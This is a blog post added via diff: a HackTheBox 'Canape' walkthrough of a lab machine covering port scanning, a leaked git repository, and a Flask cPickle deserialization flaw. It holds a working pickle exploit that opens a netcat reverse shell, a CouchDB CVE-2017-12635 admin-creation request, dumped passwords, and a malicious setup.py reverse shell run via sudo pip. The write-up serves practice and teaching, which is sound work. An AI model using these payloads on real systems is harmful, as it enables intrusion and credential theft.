@@ -1,0 +1,520 @@
+---
+layout: post
+title: "Canape "
+lang: en
+categories:
+  - writeups
+tags:
+  - security
+  - writeups
+  - linux
+  - recon
+  - network
+  - web
+  - pe
+  - python
+  - htb
+date: 2019/07/13
+thumbnail: /img/HackTheBox/canape.png
+
+toc: true
+---
+## 💢 Info 
+
+
+- **Name:** Canape
+- **Profile:** [www.hackthebox.eu](https://www.hackthebox.eu/home/machines/profile/134)
+- **Difficulty:** Medium
+- **OS:** Linux
+- **Points:** 30
+
+![canape](/img/HackTheBox/canape.png)
+
+
+
+### Network Enumeration / Reconnaissance
+
+Let's get started with a full *port scan* to see which ports are open by using [nmap](https://nmap.org/).
+
+```
+nmap -p- -R -T4 -sS --open --max-retries 2 --min-rate 500 --initial-rtt-timeout 300ms --min-rtt-timeout 50ms --max-rtt-timeout 300ms --max-scan-delay 1 -Pn 10.10.10.70 -v -oG fullport.scan -f -d
+```
+
+- `-p-` = `-p 1-65535`: all ports
+- `R`: always do DNS resolution
+- `-T4`: scan speed level 4
+- `-sS`: SYN scan
+- `--open`: show only open ports
+- `-Pn`: disable ping (no host discovery, assume the host is alive)
+- `-v`: verbose
+- `-oG` grepable output
+- `-f` (fragment) = `--mtu` (maximum transmission unit): fragment packets for firewall and IDS evasion
+- `-d`: debug
+- other options are advanced network optimizations
+
+I found only two ports open, one is HTTP and the other is unknown:
+
+```
+PORT      STATE SERVICE REASON
+80/tcp    open  http    syn-ack ttl 63
+65535/tcp open  unknown syn-ack ttl 63
+```
+
+So let's run a more aggressive scan in order to get more information:
+
+```
+nmap -sT -p80,65535 -Pn -n -A 10.10.10.70 -oG aggressive.scan -v -d
+```
+
+- `-A`: aggressive scan; this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute)
+- `sT`: TCP scan
+- `-n`: never do DNS resolution
+
+This time there is more information about the protocols:
+
+```
+PORT      STATE SERVICE REASON  VERSION
+80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: CCD1870C3EB5C66B66D9E5A31B7A7DF6
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Simpsons Fan Site
+|_http-trane-info: Problem with XML parsing of /evox/about
+65535/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDroCKFvZBROo3eo64hlNjhERjTLQmRgbCaDGhoWgs6qf9AfuTfS7LMX82ayuBjV0OHbk6Saf3SKwyLFfyLKj/mo8yGNpGjsZQ9uiN6hlpO39oQyjo9dy5DUfAabcoq82ugii982GWeHlTShQJAhAsG+7Uov2mUbO3YkKph/PBEv3uuAnNebhxlk9eg01yuHkk+8iyP6+Qp9ZzAVZsXpSuoH0raBA7VOIlYnm4Wti1AHy3VUtvmrB4KwZQT8Q3ZyMbufWFZlDB0N0/cEvyXF0kKwRIT1hNjp4HUNo0dwcDOWuwvrWVUpH3/q8VXkZRN3fL2gHsIsfuh+AyThM14hf/h
+|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLX3HkUlvdwKR+Ijy9ChJwvV7ILAPCEver9hmIr546JbveSJNyvOiq6y3YxfQu3IXomvonySAU10Fo8wVQ7kxWk=
+|   256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvWPxb1XOvko0SIhYrC5TYyQpU8tugg1qirZdtt3CXX
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.8 - 3.11 (90%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.70%E=4%D=5/1%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5AE8DD31%P=x86_64-unknown-linux-gnu)
+SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%II=I%TS=8)
+OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
+WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
+ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+```
+
+Finally there was a ssh server behind port 65535.
+
+### Service (HTTP) Enumeration / Reconnaissance
+
+Let's load the website and take a look at the source code:
+
+```html
+          <!-- 
+          c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
+          <li class="nav-item">
+            <a class="nav-link" href="/check">Check Submission</a>
+          </li>
+          -->
+```
+
+There is a hash here, we can use [hashid](https://inventory.raw.pm/tools.html#hashID) to identify the hash type.
+
+```
+$ hashid c8a74a098a60aaea1af98945bd707a7eab0ff4b0
+Analyzing 'c8a74a098a60aaea1af98945bd707a7eab0ff4b0'
+[+] SHA-1 
+[+] Double SHA-1 
+[+] RIPEMD-160 
+[+] Haval-160 
+[+] Tiger-160 
+[+] HAS-160 
+[+] LinkedIn 
+[+] Skein-256(160) 
+[+] Skein-512(160)
+```
+
+So the hash was probably generated with SHA1.
+
+Now I will use a web directory and file scanner like [dirb](http://dirb.sourceforge.net/) or [dirsearch](https://inventory.raw.pm/tools.html#dirsearch) to try to find some interesting unlinked content.
+
+With the help of one of the previously mentioned tool, I quickly found the `/.git/` directory, which is, of course, a git repository.
+
+So I will dump http://10.10.10.70/.git/ in order to get the git repository locally and be able to browse it with the git CLI.
+
+In order to dump the git repository, I used [GitTools](https://inventory.raw.pm/tools.html#GitTools) and its dumper script:
+
+```
+$ ~/CTF/tools/GitTools/Dumper/gitdumper.sh http://10.10.10.70/.git/ gitdir
+
+$ cd gitdir
+
+$ git --no-pager log --oneline 
+92eb5eb (HEAD -> master) final
+524f9dd final
+999b869 remove a
+a762ade a
+f197cbf remove doh
+36acc97 add doh
+fb79852 remove f
+64ed42c add f
+7b15317 MORE TROLLS
+a389475 trollface
+f9be9a9 add note
+c8a74a0 temporarily hide check due to vulerability
+e7bfbcf initial
+
+$ git checkout 524f9dd
+```
+
+With `git checkout 524f9dd` I jumped to a previous commit tagged as *final*.
+
+Then I reviewed a python file named `__init__.py`:
+
+```python
+import couchdb
+import string
+import random
+import base64
+import cPickle
+from flask import Flask, render_template, request
+from hashlib import md5
+
+app = Flask(__name__)
+app.config.update(
+    DATABASE = "simpsons"
+)
+db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]
+
+@app.errorhandler(404)
+def page_not_found(e):
+    if random.randrange(0, 2) > 0:
+        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
+    else:
+	return render_template("index.html")
+
+@app.route("/")
+def index():
+    return render_template("index.html")
+
+@app.route("/quotes")
+def quotes():
+    quotes = []
+    for id in db:
+        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
+    return render_template('quotes.html', entries=quotes)
+
+WHITELIST = [
+    "homer",
+    "marge",
+    "bart",
+    "lisa",
+    "maggie",
+    "moe",
+    "carl",
+    "krusty"
+]
+
+@app.route("/submit", methods=["GET", "POST"])
+def submit():
+    error = None
+    success = None
+
+    if request.method == "POST":
+        try:
+            char = request.form["character"]
+            quote = request.form["quote"]
+            if not char or not quote:
+                error = True
+            elif not any(c.lower() in char.lower() for c in WHITELIST):
+                error = True
+            else:
+                # TODO - Pickle into dictionary instead, `check` is ready
+                p_id = md5(char + quote).hexdigest()
+                outfile = open("/tmp/" + p_id + ".p", "wb")
+		outfile.write(char + quote)
+		outfile.close()
+	        success = True
+        except Exception as ex:
+            error = True
+
+    return render_template("submit.html", error=error, success=success)
+
+@app.route("/check", methods=["POST"])
+def check():
+    path = "/tmp/" + request.form["id"] + ".p"
+    data = open(path, "rb").read()
+
+    if "p1" in data:
+        item = cPickle.loads(data)
+    else:
+        item = data
+
+    return "Still reviewing: " + item
+
+if __name__ == "__main__":
+    app.run()
+```
+
+The file is describing the web application behavior.
+
+I can quickly note there is a CouchDB server running on `localhost:5984`.
+
+The web application is listing some Simpsons quotes and also allow us to submit some.
+So I can only submit quotes from whitelist Simpsons characters.
+Once submitted, the quote will be stored in a file name `"/tmp/" + md5(char + quote).hexdigest() + ".p`.
+So I know exactly where the file will be stored and how it will be named.
+
+The normal behavior will be to submit a quote like this:
+
+```
+$ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.10.70/submit -d 'character=homer&quote=testttttt'
+```
+
+Then we can check the quote was saved by computing the file id which is used for the file name and request it:
+
+```
+$ printf %s%s 'homer' 'testttttt' | md5sum | awk '{ print $1 }' | tr -d '\n'
+736dec3d7d835c35578fd1d4cf54d389
+
+$ curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.10.70/check -d 'id=736dec3d7d835c35578fd1d4cf54d389'
+```
+
+### Exploiting the web application vulnerability
+
+Did you spotted the vulnerability in the source code?
+
+When doing the *check*, the web application is loading the content of the quote file into Pickle.
+
+Note: Pickle is a python library used to serialize python objects.
+
+Why this is a vulnerability? Because pickle deserialization can lead to arbitrary code execution if the data passed to it is unsafe, like in our case, controlled by the user.
+
+There are various article on Internet explaining what is deserialization, Pickle or its exploitation like this one: [Explaining and exploiting deserialization vulnerability with Python](https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html).
+
+So here we are:
+
+1. We can control the data passed to cPickle (so we can make some code executed)
+2. We know where the file is stored (so we can trigger the payload)
+3. We have the source code (so we are able to build a valid payload targeting the web application)
+
+I created the following payload in python (name `pickle_exploit.py`):
+
+```python
+import re, cPickle, hashlib, requests, os
+
+class shell(object):
+  def __init__(self):
+    self.reverse_ip = "10.10.14.216"
+    self.reverse_port = "42424"
+  def __reduce__(self):
+    return (os.system, ("rm /tmp/shell; mknod /tmp/shell p; nc %s %s < /tmp/shell | /bin/bash > /tmp/shell" %(self.reverse_ip, self.reverse_port),))
+
+if __name__ == "__main__":
+  character = "S'homer'\n"
+  quote     = cPickle.dumps(shell())
+  if re.search('<strong>Success!</strong>', requests.post('http://10.10.10.70/submit', data={"character":character, "quote":quote}).text):
+    print 'Success'
+    p_id = hashlib.md5(character + quote).hexdigest()
+    print requests.post("http://10.10.10.70/check", data={"id":p_id}).text
+```
+
+This payload will create a reverse shell, so the server will connect back on a listener I'm controlling and offer me a bash shell.
+
+Let's start a listener and set some proper TTY environment once we are connected on the remote shell:
+
+```
+$ stty raw -echo
+$ nc -lvnp 42424
+$ SHELL=/bin/bash script -q /dev/null
+```
+
+You'll tell me, what is the black magic around netcat?
+
+This is basically for [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).
+If you are curious you can read the previously linked article and also the following man page `STTY(1)` and `SCRIPT(1)`.
+
+### Privilege Escalation of Machine  - From service to user
+
+The goal of Privilege Escalation of Machine  a.k.a. Privilege Escalation (priv esc or PE), is to go from a low privilege access tp a high privilege one.
+So here on a linux system we will try to get root.
+
+But before attacking a vulnerable service, I must find it!
+
+A good idea if not using an automated tool, is to stick to an enumeration guide like this one: [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/).
+
+The first thing we need to know is, on which operating system (OS) are we and with which kernel:
+
+```
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="16.04.4 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.4 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+$ uname -r
+4.4.0-119-generic
+```
+
+We are lucky, we won't need to do much enumeration.
+Remember?
+In the web application source code, we saw there was a CouchDB server.
+Let's see what the service has to answer:
+
+```
+$ curl http://localhost:5984/
+{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
+
+root        649    642  0 11:38 ?        Ss     0:00  \_ runsv couchdb
+root        650    649  0 11:38 ?        S      0:00      \_ svlogd -tt /var/log/couchdb
+:
+homer       663    649  0 11:38 ?        Sl     1:57      \_ /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
+```
+
+Now, I know the Apache CouchDB is in version 2.0.0.
+Bad luck for them!
+This version is vulnerable and impacted by some critical issues.
+
+- Some public vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-19046/version_id-230263/Apache-Couchdb-2.0.0.html
+- The public exploit I will use: https://www.exploit-db.com/exploits/44498/ Apache CouchDB JSON Remote Privilege Escalation Vulnerability (CVE-2017-12635)
+
+This exploit script will exploit the JSON API to create an admin user.
+As it is fairly easy, I will do it manually instead.
+
+```
+$ curl -X PUT -H 'Content-Type: application/json' -d '{"type": "user", "name": "cyfun", "roles": ["_admin"], "roles": [], "password": "nopass"}' http://localhost:5984/_users/org.couchdb.user:cyfun
+cyfun
+{"ok":true,"id":"org.couchdb.user:cyfun","rev":"1-e140e509077e57fd6bd5b5491b7c0e09"}
+```
+
+Now I have a CouchDB admin user `cyfun` with password `nopass`.
+
+Apache CouchDB documentation is available [here](https://docs.couchdb.org/en/stable/) but you won't be able to read 2.0.0 documentation as it has been archived.
+So you will have to download the PDF or HTML zip from [here](https://readthedocs.org/projects/couchdb/downloads/).
+
+You also read the PDF directly with Firefox(thanks to PDF.js): https://buildmedia.readthedocs.org/media/pdf/couchdb/2.0.0/couchdb.pdf
+
+On page 217, the endpoint `/_all_dbs` is described:
+
+> Returns a list of all the databases in the CouchDB instance.
+
+```
+$ curl -X GET http://cyfun:nopass@127.0.0.1:5984/_all_dbs -H 'Content-Type: application/json'
+'["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]'
+```
+
+We can see there is a database `_users` and a one named `password`.
+
+On page 249, the endpoint `/db/_all_docs` is described:
+
+> Apache CouchDB, Release 2.0.0{"_id": "FishStew","servings": 4,"subtitle": "Delicious with fresh bread","title": "Fish Stew"}Response:HTTP/1.1 202 AcceptedCache-Control: must-revalidateContent-Length: 28Content-Type: application/jsonDate: Tue, 13 Aug 2013 15:19:25 GMTLocation: http://localhost:5984/db/FishStewServer: CouchDB (Erlang/OTP){"id": "FishStew","ok":true}10.3.2/db/_all_docsGET /{db}/_all_docsReturns a JSON structure of all of the documents in a given database. The information is returned as a JSONstructure containing meta information about the return structure, including a list of all documents and basiccontents, consisting the ID, revision and key. The key is the from the document’s `_id`.
+
+Let's see the database `_users` first:
+
+```
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/_users/_all_docs
+{"total_rows":2,"offset":0,"rows":[
+{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
+{"id":"org.couchdb.user:cyfun","key":"org.couchdb.user:cyfun","value":{"rev":"1-e140e509077e57fd6bd5b5491b7c0e09"}}
+]}
+```
+
+Nothing much interesting here.
+
+Now the database `password`:
+
+```
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/_all_docs
+{"total_rows":4,"offset":0,"rows":[
+{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
+{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
+{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
+{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
+]}
+```
+
+Looks like there are 4 passwords here but only a reference to them.
+So I just have to request those id:
+
+```
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
+
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
+{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
+
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
+{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
+
+$ curl -X GET -H 'Content-Type: application/json' http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
+{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
+```
+
+As it is all about Simpsons from the beginning, let's target the user `homer` with password `h02ddjdj2k2k2` and try to connect to ssh with those credentials.
+
+```
+$ ssh homer@10.10.10.70 -p 65535
+
+homer@canape:~$ cat user.txt 
+bce918696f293e62b2321703bb27288d
+```
+
+Success!
+
+### Privilege Escalation of Machine  - From user to root
+
+Here I'm lucky again, no need for enumeration or exploits, just the ultimately basic check:
+
+```
+homer@canape:~$ sudo -l
+[sudo] password for homer: 
+Matching Defaults entries for homer on canape:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User homer may run the following commands on canape:
+    (root) /usr/bin/pip install *
+```
+
+It seems we can install any python package with pip as root!
+
+So let's create one that will bring me a root shell:
+
+```
+$ cd
+$ vim setup.py
+```
+
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.63",33333))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"]);
+```
+
+Now I just have to install it as root:
+
+```
+$ sudo /usr/bin/pip install -e . setup.py
+```
+
+Bingo!
+
+```
+root@canape:~# cat /root/root.txt
+cat  /root/root.txt
+928c3df1a12d7f67d2e8c2937120976d
+```
